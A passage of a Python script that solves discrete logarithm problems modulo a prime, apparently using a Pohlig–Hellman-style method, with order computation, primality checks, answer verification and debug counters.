count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, count_xi_not_found, count_calc_xi_status_false)\n\n\t\t\t\t#x_final=result[0]\n\t\t\t\tcount_nosolns=result[0]\n\t\t\t\tcount_calc_xi_no_solns=result[1]\n\t\t\t\tcount_normal_soln=result[2]\n\t\t\t\t#x_moduli_final=result[4]\n\t\t\t\tanswers_to_be_checked=result[3]\n\t\t\t\tcount_x_equals_0=result[4]\n\t\t\t\tcount_needlargerprimelist=result[5]\n\t\t\t\tcount_notprime=result[6]\n\t\t\t\tq_e_nf_order_p_list=result[7]\n\t\t\t\tcount_xi_not_found=result[8]\n\t\t\t\tcount_calc_xi_status_false=result[9]\n\t\t\t\tprevious_calc_orders=result[10]\n\n\t#print(\"Grand_total_considered: \"+str(Grand_total_values)+\", total_g_values: \"+str(total_g_values)+\", total_p_values: \"+str(total_p_values)+\", total_h_values: \"+str(total_h_values)+\", number_no_solns: \"+str(count_nosolns)+\", largerprimelist: \"+str(count_needlargerprimelist)+\", count_q_e_found: \"+str(count_q_e_found)+\", count_q_e_not_found: \"+str(count_q_e_not_found)+\", count_order_prime: \"+str(count_order_prime)+\", count_order_not_prime: \"+str(count_order_not_prime)+\", count_xi_not_found: \"+str(count_xi_not_found)+\", count_calc_xi_status_false: \"+str(count_calc_xi_status_false))\n\n\tprint(\"total_g_values: \"+str(total_g_values)+\", total_p_values: \"+str(total_p_values)+\", number_no_solns: \"+str(count_nosolns)+\", largerprimelist: \"+str(count_needlargerprimelist)+\", count_q_e_found: \"+str(count_q_e_found)+\", count_q_e_not_found: \"+str(count_q_e_not_found)+\", count_order_prime: \"+str(count_order_prime)+\", count_order_not_prime: \"+str(count_order_not_prime)+\", count_xi_not_found: \"+str(count_xi_not_found)+\", count_calc_xi_status_false: \"+str(count_calc_xi_status_false))\n\ndef Calc_prop_234(g,p,count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p, previous_calc_orders, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, count_xi_not_found, count_calc_xi_status_false):\n\n\tprint(\"Running Calc_prop_234(\",g,\",\",p,\")\")\n\n\tif str(g)+\"_\"+str(p) in previous_calc_g_p:\n\t\t#Order for g & p has already been calculated previously\n\t\tprint(\"Order for g_new:\",g,\",p:\",p,\"has already been calculated previously\")\n\t\tinput(\"Waiting for user..\")\n\t\torder=\"\"\n\n\n\n\n\t\treturn count_nosolns, count_calc_xi_no_solns, count_normal_soln, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false, previous_calc_orders\n\n\n\telif str(g)+\"_\"+str(p) not in previous_calc_g_p:\n\t\tg_p_to_append=[]\n\t\tg_p_to_append.append(str(g)+\"_\"+str(p))\n\t\tprevious_calc_g_p.append(g_p_to_append)\n\n\t\tif g == 1:\n\t\t\t#order = Not found!\n\t\t\tprint(\"order not found - g = 1\")\n\t\t\tcount_nosolns = count_nosolns + 1\n\t\t\tcount_order_not_prime = count_order_not_prime + 1\n\t\t\tcount_q_e_not_found = count_q_e_not_found + 1\n\t\t\torder=\"Not found\"\n\n\t\t\tg_p_order_to_append=[]\n\t\t\tg_p_order_to_append.append(str(g)+\"_\"+str(p))\n\t\t\tg_p_order_to_append.append(str(order))\n\t\t\tprevious_calc_orders.append(g_p_order_to_append)\n\n\t\telse:\n\t\t\tprint(\"previous_calc_orders:\",previous_calc_orders)\n\t\t\t#input(\"waiting for user..\")\n\t\t\tif g_p_to_append in previous_calc_orders:\n\t\t\t\tprint(\"g_p_to_append:\",g_p_to_append,\" is in previous_calc_orders\")\n\t\t\t\tprint(previous_calc_orders.index(g_p_order_to_append))\n\t\t\t\tinput(\"waiting for user..\")\n\n\t\t\telse:\n                #Calculate order\n\t\t\t\tprint(\"g_p_to_append:\",g_p_to_append,\" is NOT in previous_calc_orders\")\n\t\t\t\tinput(\"waiting for user..\")\t\t\t\t\t\n\t\t\t\torder_result = calc_order(g, p, count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p)\n\n\t\t\t    #return count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\n\t\t\t\tcount_nosolns = order_result[0]\n\t\t\t\tcount_order_not_prime = order_result[1]\n\t\t\t\tcount_q_e_found = order_result[2]\n\t\t\t\tcount_q_e_not_found = order_result[3]\n\t\t\t\tq_e_nf_order_p_list = order_result[4]\n\t\t\t\tq = order_result[5]\n\t\t\t\te = order_result[6]\n\t\t\t\torder_status = order_result[7]\n\t\t\t\tn_prime = order_result[8]\n\t\t\t\tcount_order_prime = order_result[9]\n\t\t\t\torder = order_result[10]\n\t\t\t\tlhs = order_result[11]\n\t\t\t\tconcat_order_p=str(order)+\"_\"+str(p)\n\n\t\t\t\tg_p_order_to_append=[]\n\t\t\t\tg_p_order_to_append.append(str(g)+\"_\"+str(p))\n\t\t\t\tg_p_order_to_append.append(order)\n\t\t\t\tprevious_calc_orders.append(g_p_order_to_append)\n\t\t\t\t\n\t\t\t\tif str(order)+\"_\"+str(p) in q_e_nf_order_p_list:\n\t\t\t\t    #print(str(order)+\"_\"+str(p),\"is in q_e_nf_order_p_list\")\n\t\t\t\t    #elif concat_g_p in order_false_list:\n\t\t\t\t\tcount_nosolns = count_nosolns + len(range(1, p+1))\n\t\t\t\t    #count_nosolns = count_nosolns + len(h_values)\n\t\t\t\t    #print(\"Previously calculated - \"+str(concat_order_p)+\" is NOT in form q**e !\"\n\t\t\t\t\tx_final = \"No solns!\"\t\t\t\n\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", x: \"+str(x_final)+\", no_solns: \"+str(count_nosolns)+\", largerprimelist: \"+str(count_needlargerprimelist)+\", count_q_e_found: \"+str(count_q_e_found)+\", count_q_e_not_found: \"+str(count_q_e_not_found)+\", count_order_prime: \"+str(count_order_prime)+\", count_order_not_prime: \"+str(count_order_not_prime)+\", count_xi_not_found: \"+str(count_xi_not_found)+\", count_calc_xi_status_false: \"+str(count_calc_xi_status_false)\n\t\t\t\telse:\n\t\t\t\t\th_soln_alreadyfound = False\n\t\t\t\t\tfor h in range(1, p+1):\n\t\t\t\t    #for h in h_values:\t\t\t\t\t\t\t\t\n\t\t\t\t    #concat_g_h = str(g)+\"_\"+str(h)\n\t\t\t\t\t    #print(\"-----------------------------------\"\n\t\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)\n\t\t\t\t\t\tif h >= p:\n\t\t\t\t\t\t    #print(\"Setting h_soln_alreadyfound to true..\"\n\t\t\t\t\t\t\th_soln_alreadyfound = True\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tbreak\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\telif g == h:\n\t\t\t\t\t\t\tx_final = 1\n\t\t\t\t\t\t\tx_moduli_final = p - 1\n\t\t\t\t\t\t\tx_to_print = str(x_final)+\" mod \"+str(x_moduli_final)\n\t\n\t\t\t\t\t\t    #Check answers\n\t\t\t\t\t\t\tif pow(g, x_final, p) != h:\n\t\t\t\t\t\t\t\tprint(\"CHECK x_final! g_new: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x_final)+\", x_moduli: \"+str(x_moduli))\n\t\t\t\t\t\t\t\tinput(\"Waiting for user..\")\n\n\t\t\t\t\t\t\telif pow(g, x_final + x_moduli_final, p) != h:\n\t\t\t\t\t\t\t\tprint(\"CHECK x_moduli_final! g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x_final)+\", x_moduli_final: \"+str(x_moduli_final))\n\t\t\t\t\t\t\t\tinput(\"Waiting for user..\")\n\n\t\t\t\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", x: \"+str(x_final)\n\t\t\t\t\t\t\n\t\t\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", x: \"+str(x_final)+\", no_solns: \"+str(count_nosolns)+\", largerprimelist: \"+str(count_needlargerprimelist)+\", count_q_e_found: \"+str(count_q_e_found)+\", count_q_e_not_found: \"+str(count_q_e_not_found)+\", count_order_prime: \"+str(count_order_prime)+\", count_order_not_prime: \"+str(count_order_not_prime)+\", count_xi_not_found: \"+str(count_xi_not_found)+\", count_calc_xi_status_false: \"+str(count_calc_xi_status_false)\t\t\t\t\t\t\t\n\t\n\t\t\t\t\t\telse:\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif order_status == True:\n\t\t\t\t\t\t\t    #print(\"q is: \"+str(q)+\", e is: \"+str(e) \n\t\t\t\t\t\t\t    #dlp is:  g**x congruent to h mod p, where g, h and p are known, p prime.\t\n\t\t\t\t\t\t\t    #print('Running dlp()..')\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t    #print(\"-----------------------------------\"\n\t\t\t\t\t\t\t    #print(\"count_nosolns before dlp(): \"+str(count_nosolns)\n\n\t\t\t\t\t\t\t\tresult = dlp(g, p, h, count_nosolns, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, q_e_nf_order_p_list, primes, q, e, n_prime, count_xi_not_found, count_calc_xi_status_false, lhs)\n\n\t\t\t\t\t\t\t    #print(\"return back to h_values loop..\"\t\t\t\t\t\t\t\t\n\n\t\t\t\t\t\t\t\tx_final = result[0]\n\t\t\t\t\t\t\t\tcount_nosolns = result[1]\n\t\t\t\t\t\t\t\tcount_calc_xi_no_solns = result[2]\n\t\t\t\t\t\t\t\tcount_normal_soln = result[3]\n\t\t\t\t\t\t\t\tx_moduli_final = result[4]\n\t\t\t\t\t\t\t\tanswers_to_be_checked.append(result[5])\n\t\t\t\t\t\t\t\tcount_x_equals_0 = result[6]\n\t\t\t\t\t\t\t\tcount_needlargerprimelist = result[7]\n\t\t\t\t\t\t\t\tcount_notprime = result[8]\n\t\t\t\t\t\t\t\tq_e_nf_order_p_list = result[9]\n\t\t\t\t\t\t\t    #order_false_list = result[9]\n\t\t\t\t\t\t\t\tcount_xi_not_found = result[10]\n\t\t\t\t\t\t\t\tcount_calc_xi_status_false = result[11]\n\n\t\t\t\t\t\t\t    #print(\"count_nosolns after dlp(): \"+str(count_nosolns)\n\t\t\t\t\t\t\t    #print(\"x_final is: \"+str(x_final))\n\t\t\t\t\t\t\t    #print(\"x_moduli_final is: \"+str(x_moduli_final)\n\t\t\t\t\t\t\t\tif x_final != \"No solns!\":\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t    #print(\"x_final != No solns!\"\n\t\t\t\t\t\t\t\t    x_to_print = str(x_final)+\" mod \"+str(x_moduli_final)\n\t\t\t\t\t\t\t\t    #input(\"Waiting for user..\")\t\t\t\t\t\t\n\n\t\t\t\t\t\t\t\t    #Check answers\n\t\t\t\t\t\t\t\t    if pow(g, x_final, p) != h:\n\t\t\t\t\t\t\t\t\t    print(\"CHECK x_final! g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x_final)+\", x_moduli: \"+str(x_moduli))\n\t\t\t\t\t\t\t\t\t    input(\"Waiting for user..\")\n\n\t\t\t\t\t\t\t\t    elif pow(g, x_final + x_moduli_final, p) != h:\n\t\t\t\t\t\t\t\t\t    print(\"CHECK x_moduli_final! g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x_final)+\", x_moduli_final: \"+str(x_moduli_final))\n\t\t\t\t\t\t\t\t\t    input(\"Waiting for user..\")\n\n\t\t\t\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", x: \"+str(x_final)\n\n\t\t\t\t\t\t\telif order_status != False:\n\t\t\t\t\t\t\t\tprint(\"***ERROR!!!*** order_status is: \"+str(order_status))\n\t\t\t\t\t\t\t\tinput(\"Waiting for user..\")\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t    #error=True\n\n\n\t\treturn count_nosolns, count_calc_xi_no_solns, count_normal_soln, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false, previous_calc_orders\n\n\telse:\t\t\t\t\n\t\tprint(\"Order for g:\",g,\",p:\",p,\"does not match criteria - not in previous_calc_g_p!\")\n\n\n\t\treturn count_nosolns, count_calc_xi_no_solns, count_normal_soln, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false, previous_calc_orders\n\n\ndef ghp_checks(g,h,p,floor_sqrt_p, count_a_notprime):\t\n\t\n\t#print(\"Running ghp_checks()..\"\n\n\t#Assuming p is prime: \t\tBest case: O(sqrt(n)+5)\t\tWorst case: O(sqrt(n)+8)\n\t#Assuming p is not prime: \tO(sqrt(n)+5)\n\n\tstatus=1\n\t\n\t#Simple Checks for g & h:\n\tif (g==0 or h==0):\t\t\t\t#O(1)\n\t\tprint('One or more numbers entered for g, h and p are 0. Please choose numbers that are not 0.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\telif g==1:\t\t\t\t\t#O(1)\n\t\tprint('g = 1 has trivial solutions for the dlp. Please choose another number.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\telif g<0:\t\t\t\t\t#O(1)\n\t\tprint('Number for g is negative. Please enter another number.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\n\t#Check if g = p:\n\telif g == p:\n\t\tprint('g = p. x is any integer. Please enter other numbers for g and p.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\n\t#Check if h < p:\n\telif h >= p:\n\t\tprint('h is >= p. Please enter other numbers for h and p.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\n\t#Need to check if p is prime\n\t#print('Checking if p is prime ..')\n\ta = isprime(p)\t\t\t\t\t#O(sqrt(n))\t\n\t#True for Prime\n\t#False for not prime\t\n\tif a == False:\t\t\t\t\t#O(1)\t#Best case: O(5)\n\t\tprint('The number entered for p: '+str(p)+' is not prime. Please choose a number that is prime for p.')\t\t\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tcount_a_notprime = count_a_notprime + 1\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\n\t#return status, a, b, q\n\treturn status, a\n\ndef isprime(p):\t\t\t#this is O(sqrt(n))\n\t\n\t#print(\"Running isprime(\",p,\")\")\n\t\n\t# www.rookieslab.com/posts/fastest-way-to-check-if-a-number-is-prime-or-not\n\tif p==1:\n\t\treturn False\t\n\t\t\n\ti = 2\n\twhile i*i <= p:\n\t\t#print(\"p is: \"+str(p)+\", i is: \"+str(i)\t\t#\"g = 4\" #\"p is: No exponent found, i is: 2\"\n\t\tif p % i == 0:\n\t\t\treturn False\n\t\ti += 1\n\n\treturn True\t\t\n\ndef dlp(g, p, h, count_nosolns, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, q_e_nf_order_p_list, primes, q, e, n_prime, count_xi_not_found, count_calc_xi_status_false, lhs):\n\n\t#print(\"-------------------------------------------------\"\n\t#print(\"Running dlp(\"+str(g)+\", \"+str(p)+\", \"+str(h)+\"..)\"\n\n\tfloor_sqrt_p = int(math.floor(math.sqrt(p)))\t\t\t#O(3)\n\t#print('floor_sqrt_p is: '+str(floor_sqrt_p))\n\n\t#Run checks on g, h & p\t\n\t#result=ghp_checks(g,h,p,floor_sqrt_p)\n\t#count_notprime = 0\t\t\t\t\t\t#O(1)\n\t\n\tresult=ghp_checks(g, h, p, floor_sqrt_p, count_notprime) \t#Best case: O(sqrt(n)+5) \tWorst case: O(sqrt(n)+8)\n\t#return status, a\n\t#status=0 for problem and 1 for no problem\n\t#a=True for Prime, a=False for not prime\n\t\n\tstatus_ghp = result[0]\n\tstatus_isprime_a = result[1]\n\n\tif status_isprime_a == False:\t\t\t\t\t#O(1)\n\t\tcount_notprime = count_notprime + 1\t\t\t#O(1)\n\t\tprint(str(p),\" is not prime! Exiting..\")\t\n\t\tsys.exit()\t\t\t\t\t\t\t#O(1)\n\telif status_ghp == 0:\t\t\t\t\t\t#O(1)\n\t\tprint(\"At least one of checks for g, h or p failed! Exiting..\")\t\n\t\tsys.exit()\t\t\t\t\t\t\t#O(1)\n\telse:\n\t\t#store result of p and isprime(p) so later we do not need to run isprime(p) again\t\t\t\t\n\t\tn_prime.append(p)\n\t\t\n\t\t#print(\"n_prime is: \"+str(n_prime)\n\n\t\t#check if sqrt_p > largest element in primes\n\t\t#print('checking if square root of p > largest element in primes...')\n\t\tsqrt_p = math.sqrt(p)\t\t\t\t\t#O(1)\n\t\tlargest_prime = primes[-1]\t\t\t\t#O(???)\n\t\tif sqrt_p > largest_prime:\t\t\t\t#O(1)\t#Subtotal: O(4)\n\t\t\tprint('Square root of p - '+str(sqrt_p)+' is greater than largest prime in list - '+str(largest_prime)+'. Consider using a larger prime list. Exiting..')\n\t\t\tcount_needlargerprimelist = count_needlargerprimelist + 1\n\t\t\tsys.exit()\n\t\telse:\t\t\t\t\t\t\t#O(1)\n\t\t\t#initialise lists\t\n\t\t\tx=[]\t\t\n\t\t\tx_moduli=[]\n\t\t\t\t\t\n\t\t\t################################################\n\t\t\t# Prop_234 Algorithm\n\t\t\t\n\t\t\t#print(\"g: \"+str(g)+\", h: \"+str(h)+\", q: \"+str(q)+\", e: \"+str(e)+\", p: \"+str(p)\n\t\t\t#count_xi_not_found, count_calc_xi_status_false\n\t\t\tresult_prop_234 = prop_234(g, h, q, e, p, count_xi_not_found, count_calc_xi_status_false, lhs)\n\t\t\t#result_prop_234 = prop_234(g, h, q, e, p)\n\t\t\t\n\t\t\t#return x, M, calc_xi_status, xi_found, count_xi_not_found, count_calc_xi_status_false\n\t\t\n\t\t\tx_initial = result_prop_234[0]\n\t\t\tmoduli = result_prop_234[1]\n\t\t\tcalc_xi_status = result_prop_234[2]\t\t\t\t#O(1)\t\t\t\t\n\t\t\txi_found = result_prop_234[3]\t\t\t\t\t#O(1)\t\n\t\t\tcount_xi_not_found = result_prop_234[4]\n\t\t\tcount_calc_xi_status_false = result_prop_234[5]\n\n\t\t\t#print(\"calc_xi_status is: \"+str(calc_xi_status)\n\t\t\tif calc_xi_status == True and xi_found == True:\n\t\t\t\t#Calc_xi method found solutions\n\t\t\t\t#print(\"x_initial is: \"+str(x_initial))\n\t\t\t\tx.append(x_initial)\n\t\t\t\t#print(\"x is: \"+str(x[0]))\n\t\t\t\t#print str(x_initial)+\" appended to x\"\n\t\t\t\tif x_initial == 0:\t\t\n\t\t\t\t\t#print(\"x[0] = 0\")\n\t\t\t\t\tcount_x_equals_0 = count_x_equals_0 + 1 \n\t\t\t\t\tx_moduli.append(moduli)\n\t\t\t\t\tif moduli == 0:\n\t\t\t\t\t\tprint(\"x[0]=0 and x_moduli[0] is 0!\")\n\t\t\t\t\t\tinput(\"Waiting for user..\")\n\t\t\t\t\telse:\n\t\t\t\t\t\tcount_normal_soln = count_normal_soln + 1\n\n\t\t\t\t\tif pow(g,x[0],p) != h:\t\t\t#O(1)\n\t\t\t\t\t\t#print(\"CHECK ANSWER!!!\"\n\t\t\t\t\t\tprint(\"CHECK FAILED - g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x[0])+\", x_moduli: \"+str(x_moduli[0]))\n\t\t\t\t\t\tanswers_to_be_checked.append(\"g: \"+str(g)+\" h: \"+str(h)+\" p: \"+str(p)+\" x: \"+str(x[0]))\t#O(1)\n\t\t\t\t\t\tsys.exit()\n\n\t\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, 0, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\n\t\t\t\telse:\n\t\t\t\t\t#print(\"x[0] != 0\"\n\t\t\t\t\tx_moduli.append(moduli)\n\t\t\t\t\t#print str(result_prop_234[1])+\" appended to x_moduli\"\n\t\t\t\t\tif moduli == 0:\n\t\t\t\t\t\tprint(\"x[0] != 0 and moduli is 0!\")\n\t\t\t\t\t\tinput(\"Waiting for user..\")\n\t\t\t\t\tcount_normal_soln = count_normal_soln + 1\n\t\t\t\t\tif pow(g,x[0],p) != h:\t\t\t#O(1)\n\t\t\t\t\t\t#print(\"CHECK ANSWER!!!\"\n\t\t\t\t\t\tprint(\"CHECK FAILED - g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x[0])+\", x_moduli: \"+str(x_moduli[0]))\n\t\t\t\t\t\tanswers_to_be_checked.append(str(g)+\"_\"+str(h)+\"_\"+str(p)+\"_\"+str(x[0]))\t#O(1)\n\t\t\t\t\t\tsys.exit()\n\n\t\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, x_moduli[0], answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\n\t\t\telif xi_found == False:\n\t\t\t\t#input(\"xi_found = False ! \")\n\t\t\t\t#Calc_xi method failed to find solutions - an xi was not found !\n\t\t\t\t#print(\"Calc_xi method failed to find solutions - an xi was not found ! \"\n\t\t\t\t#x.append(0)\n\t\t\t\tx.append(\"No solns!\")\n\t\t\t\tcount_calc_xi_no_solns = count_calc_xi_no_solns + 1\n\t\t\t\tcount_nosolns = count_nosolns + 1\t\t\t\t#O(1)\n\n\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, 0, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\t\t\telif calc_xi_status == False:\n\t\t\t\t#input(\"calc_xi_status = False ! \")\n\t\t\t\t#Calc_xi method failed to find solutions - lhs=1 and rhs=1\t\n\t\t\t\t#print(\"Calc_xi method failed to find solutions - calc_xi_status is false ! \"\n\t\t\t\tx.append(\"No solns!\")\n\t\t\t\t#x.append(0)\n\t\t\t\tcount_calc_xi_no_solns = count_calc_xi_no_solns + 1\n\t\t\t\tcount_nosolns = count_nosolns + 1\t\t\t\t#O(1)\n\t\t\t\t#sys.exit()\n\n\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, 0, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\t\t\telse:\n\t\t\t\tprint(\"calc_xi_status is: \"+str(calc_xi_status))\n\t\t\t\tprint(\"xi_found is: \"+str(calc_xi_status))\n\t\t\t\tinput(\"Waiting for user..\")\n\t\t\t\t#sys.exit()\n\n\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, 0, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\n#def calc_order(g, p, count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, order_false_list, primes, n_prime, count_order_prime):\n\n#def calc_order(g, p, count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime):\n\ndef calc_order(g, p, count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p):\n\n\t#print(\"Running calc_order(\"+str(g)+\", \"+str(p)+\", ..)\")\n\t#print(\"previous_calc_g_p:\",previous_calc_g_p)\n\t#print(\"Need to calculate & check order for: \"+str(g)+\"_\"+str(p)\n\t#print(\"Need to calculate & check order for: \"+str(concat_g_p)\t\t\t\t\t\n\n\t#use exponent function to get order of g mod p\n\tresult = exponent_g_p(g, p)\t\t\t\t#Worst: O(n + 7)\t#Best: O(8)\n\t#return x, status\n\t#status is False for \"no exponent found\"\t\n\t#status is True for exponent found\n\torder = result[0]\t\t\t\t\t#O(1)\n\tstatus = result[1]\t\t\t\t\t#O(1)\n\t#status = result[1]\t\t\t\t\t\n\n\t#print(\"order is: \"+str(order)\n\t#input(\"Waiting for user..\")\n\n\t#sqrt_order=math.floor(math.sqrt(order))\n\n\t# Now want order = q**e, where q is prime\n\t# obtain q and e \n\tif status == False:\t\t\t\t\t#O(1)\n\t\tq=0\t\t\t\t\t\t\t#O(1)\n\t\te=0\t\t\t\t\t\t\t#O(1)\n\t\tconcat_order_p = str(order)+\"_\"+str(p)\n\t\tq_e_nf_order_p_list.append(concat_order_p)\t\t#O(1)\n\t\tcount_order_not_prime = count_order_not_prime + 1\t#O(1)\n\t\tcount_q_e_not_found = count_q_e_not_found + 1\t\t#O(1)\n\t\tcount_nosolns = count_nosolns + 1\t\t\t#O(1)\n\t\torder_status = False\n\t\tlhs = 0\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\telif order == 1:\t\t\t\t\t#O(1)\n\t\tq = order\t\t\t\t\t\t#O(1)\n\t\te = 1\t\t\t\t\t\t\t#O(1)\n\t\tprint(\"q:\",q,\"e:\",e,\"g:\",g,\"p:\",p,)\n\t\t#input(\"Order is 1! Waiting for user..\")\n\t\t#print(\"order: \"+str(order)\n\t\t#order_false_list.append(str(g)+\"_\"+str(p))\n\t\tconcat_order_p = str(order)+\"_\"+str(p)\n\t\tq_e_nf_order_p_list.append(concat_order_p)\n\t\tcount_order_not_prime = count_order_not_prime + 1\t#O(1)\n\t\tcount_q_e_not_found = count_q_e_not_found + 1\t\t#O(1)\n\t\tcount_nosolns = count_nosolns + 1\t\t\t#O(1)\n\t\t#x_final = \"No solns!\"\n\t\torder_status = False\n\t\t#counts_added = True\n\t\tq = 0\n\t\te = 0\n\t\tlhs = 0\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\telif order in n_prime:\t\t\t\t\n\t\t#print(\"order: \"+str(order)+\" is prime\"\n\t\tq = order\t\t\t\t\t\t#O(1)\n\t\te = 1\t\t\t\t\t\t\t#O(1)\n\t\tcount_order_prime = count_order_prime + 1\t\t#O(1)\n\t\tcount_q_e_found = count_q_e_found + 1\t\t\t#O(1)\n\t\torder_status = True\n\t\tlhs = pow(g,1,p)\n\t\t#counts_added = True\n\t\t#print(\"q: \"+str(q)+\", e: \"+str(e)\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\telif isprime(order) == True:\t\t\t\t#O(sqrt(n))\n\t\t#True for prime\n\t\t#False for not prime\n\t\t#order is prime\n\t\t#print(\"order: \"+str(order)+\" is prime\"\n\t\tn_prime.append(order)\n\t\tq = order\t\t\t\t\t\t#O(1)\n\t\te = 1\t\t\t\t\t\t\t#O(1)\n\t\tcount_order_prime = count_order_prime + 1\t\t#O(1)\n\t\torder_status=True\n\t\tcount_q_e_found = count_q_e_found + 1\t\t\t#O(1)\n\t\tlhs = pow(g,1,p)\n\t\t#counts_added = True\n\t\t#print(\"q: \"+str(q)+\", e: \"+str(e)\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\n\telse:\n\t\t#print(\"order is: \"+str(order)+\" - not 1 nor prime!\"\n\t\t#input(\"Waiting for user..\")\n\t\t#order is not 1 nor prime\t\t\n\t\tcount_order_not_prime = count_order_not_prime + 1\t#O(1)\n\n\t\t#now check if order is of form q**e, where q is prime, e>=1. \n\t\t#Need to find q and e.\n\t\t\t\t\t\n\t\tresult = calc_q_e(primes, order, p)\t\t\t#Worst: O(n**2+7n+4)\t#Best: O(12)\n\t\t#return q, e, result\n\n\t\tq=result[0]\t\t\t\t\t\t#O(1)\n\t\te=result[1]\t\t\t\t\t\t#O(1)\n\t\torder_status=result[2]\t\t\t\t\t#O(1)\n\t\t#status=result[2]\t\t\t\t\t\n\t\t#counts_added = False\t\t\t\t\n\t\t#print(\"order_status is: \"+str(order_status)\n\n\t\tif order_status == False:\n\t\t\tconcat_order_p = str(order)+\"_\"+str(p)\n\t\t\tq_e_nf_order_p_list.append(concat_order_p)\n\t\t\t#order_false_list.append(str(g)+\"_\"+str(p))\t\t#O(1)\n\t\t\tcount_q_e_not_found = count_q_e_not_found + 1\t\t#O(1)\n\t\t\tlhs = 0\n\t\t\t#counts_added = True\n\t\telif order_status == True:\n\t\t\tlhs = pow(g,pow(q,e-1),p)\n\t\t\tcount_q_e_found = count_q_e_found + 